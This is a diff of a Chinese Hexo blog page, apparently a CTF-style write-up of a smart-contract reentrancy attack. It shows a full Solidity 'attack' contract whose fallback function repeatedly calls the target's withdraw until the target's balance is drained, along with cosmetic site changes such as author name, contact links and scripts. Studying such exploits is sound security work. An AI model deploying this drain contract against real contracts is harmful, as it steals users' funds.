 <p>这时会直接进入到这个合约的fallback或者receive函数中，这时我们可以编写一个特殊的合约，让接收函数的fallback函数重复调用目标合约的<code>withdraw</code>函数，这样合约就会不断给我们所编写的合约转账直至余额为0。具体代码如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line"></span><br><span class="line">    address payable target;</span><br><span class="line">    address payable public owner;</span><br><span class="line">    uint amount = 100000000000000 wei;</span><br><span class="line"></span><br><span class="line">    constructor(address payable _addr) public payable &#123;</span><br><span class="line">        target=_addr;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step1() public payable&#123;</span><br><span class="line">        bool b;</span><br><span class="line">        (b,)=target.call&#123;value: amount&#125;(abi.encodeWithSignature(&quot;donate(address)&quot;,address(this)));</span><br><span class="line">        require(b,&quot;step1 error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setp2() public payable &#123;</span><br><span class="line">        bool b;</span><br><span class="line">        (b,)=target.call(abi.encodeWithSignature(&quot;withdraw(uint256)&quot;,amount));</span><br><span class="line">        require(b,&quot;step2 error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fallback () external payable&#123;</span><br><span class="line">        bool b;</span><br><span class="line">        (b,)=target.call(abi.encodeWithSignature(&quot;withdraw(uint256)&quot;,amount));</span><br><span class="line">        require(b,&quot;fallback error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mywithdraw() external payable&#123;</span><br><span class="line">        require(msg.sender==owner,&#x27;not you&#x27;);</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span>
+<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span>
+
+<span class="token keyword">contract</span> <span class="token class-name">attack</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token builtin">address</span> <span class="token keyword">payable</span> target<span class="token punctuation">;</span>
+    <span class="token builtin">address</span> <span class="token keyword">payable</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>
+    <span class="token builtin">uint</span> amount <span class="token operator">=</span> <span class="token number">100000000000000</span> wei<span class="token punctuation">;</span>
+
+    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _addr<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>
+        target<span class="token operator">=</span>_addr<span class="token punctuation">;</span>
+        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">step1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>
+        <span class="token builtin">bool</span> b<span class="token punctuation">;</span>
+        <span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token operator">=</span>target<span class="token punctuation">.</span>call<span class="token punctuation">&#123;</span>value<span class="token punctuation">:</span> amount<span class="token punctuation">&#125;</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"donate(address)"</span><span class="token punctuation">,</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">require</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token string">"step1 error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">setp2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>
+        <span class="token builtin">bool</span> b<span class="token punctuation">;</span>
+        <span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token operator">=</span>target<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"withdraw(uint256)"</span><span class="token punctuation">,</span>amount<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">require</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token string">"step2 error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+
+    fallback <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>
+        <span class="token builtin">bool</span> b<span class="token punctuation">;</span>
+        <span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token operator">=</span>target<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"withdraw(uint256)"</span><span class="token punctuation">,</span>amount<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">require</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token string">"fallback error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">mywithdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token operator">==</span>owner<span class="token punctuation">,</span><span class="token string">'not you'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>1000000000000000</p>
 <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
@@ -660,7 +985,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">Jlan</a>
+                    <a href="/about" rel="external nofollow noreferrer">J1an</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -683,7 +1008,7 @@
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">Jlan</a>
+                    <a href="/about" target="_blank">J1an</a>
                     !
                 </span>
             </div>
@@ -726,39 +1051,6 @@
 
                 </div>
             </div>
-            
-                <div id="reward">
-    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
-
-    <!-- Modal Structure -->
-    <div id="rewardModal" class="modal">
-        <div class="modal-content">
-            <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
-            <div class="reward-content">
-                <div class="reward-tabs">
-                    <ul class="tabs row">
-                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
-                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
-                    </ul>
-                    <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
-                    </div>
-                    <div id="wechat">
-                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<script>
-    $(function () {
-        $('.tabs').tabs();
-    });
-</script>
-
             
         </div>
     </div>
@@ -810,7 +1102,7 @@
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -847,7 +1139,7 @@
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -866,6 +1158,9 @@
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
@@ -974,69 +1269,15 @@
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
-
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="/libs/aplayer/Meting.min.js"></script>
-
-    
 
     <div class="container row center-align"
          style="margin-bottom: 0px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2019-2022</span>
+                <span id="year">2022</span>
             
-            <a href="/about" target="_blank">Jlan</a>
+            <a href="/about" target="_blank">J1an</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
@@ -1071,7 +1312,7 @@
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:jlan@icloud.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
     </a>
 
@@ -1079,10 +1320,8 @@
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
+    <a href="https://twitter.com/J1an45" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/J1an45" data-position="top" data-delay="50">
+        <i class="fab fa-twitter"></i>
     </a>
 
 
@@ -1091,9 +1330,7 @@
 
 
 
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
+
 
 </div>
     </div>
@@ -1253,6 +1490,14 @@ $(function () {
     
 
     <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
     
 
      
@@ -1279,8 +1524,6 @@ $(function () {
     })();
 </script>
 
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
     
     
     <script async src="/libs/others/busuanzi.pure.mini.js"></script>
